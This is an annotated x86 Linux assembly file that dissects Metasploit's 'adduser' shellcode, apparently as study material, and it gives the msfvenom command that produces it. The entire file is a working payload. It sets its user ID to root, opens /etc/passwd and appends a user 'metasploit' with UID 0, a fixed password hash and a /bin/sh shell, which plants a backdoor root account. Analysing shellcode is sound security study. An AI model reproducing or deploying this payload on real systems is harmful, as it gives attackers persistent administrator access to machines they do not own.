; adduser.nasm
;  - Analyzed shellcode from metasploit
;
; > msfvenom -a x86 --platform linux -p linux/x86/adduser -f c

global _start

section .text
_start:

	; int setreuid(uid_t ruid, uid_t euid)
	; eax = 0x46 (setreuid)
	; ebx = 0x0
	; ecx = 0x0

	xor ecx,ecx
	mov ebx,ecx
	push byte +0x46
	pop eax
	int 0x80


	; int open(const char *pathname, int flags)
	; eax = 0x5 (open)
	; ebx = esp
	; ecx = 0x1
	; esp => |0x2f657463|0x2f2f7071|0x73737764|
	;            /etc       //pa       sswd

	push byte +0x5
	pop eax
	xor ecx,ecx
	push ecx
	push dword 0x64777373	; dwss
	push dword 0x61702f2f	; ap//
	push dword 0x6374652f	; cte/
	mov ebx,esp
	inc ecx
	mov ch,0x4
	int 0x80

	xchg eax,ebx		; save handle for write
	call section_2		; call pop

section_1:

	insd			; m		
	gs jz 0x90		; eta
	jnc 0xa1		; sp
	insb			; l
	outsd			; o
	imul esi,[edx+edi+0x41],dword 0x49642f7a	;it:Az/dI
	jnc 0xa7		; sj
	xor al,0x70		; 4p
	xor al,0x49		; 4I
	push edx		; R
	arpl [edx],di		; c:
	xor [edx],bh		; 0:
	xor [edx],bh		; 0:
	cmp ch,[edi]		; :/
	cmp ch,[edi]		; :/
	bound ebp,[ecx+0x6e]	; bin
	das			; /
	jnc 0xba		; sh
	db 0x0a			; \n

section_2:

	; ssize_t write(int fd, const void *buf, size_t count)
	; eax = 0x4 (write)
	; ebx = file handle from open
	; ecx => metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n
	; edx = 0x28 (40)

	pop ecx			; save pointer to section_1
	mov edx,[ecx-0x4]	; clever way set edx to 40
	push byte +0x4
	pop eax
	int 0x80


	; void exit(int status)
        ; eax = 0x1 (exit)
        ; ebx = 0x0

	push byte +0x1
	pop eax
	int 0x80
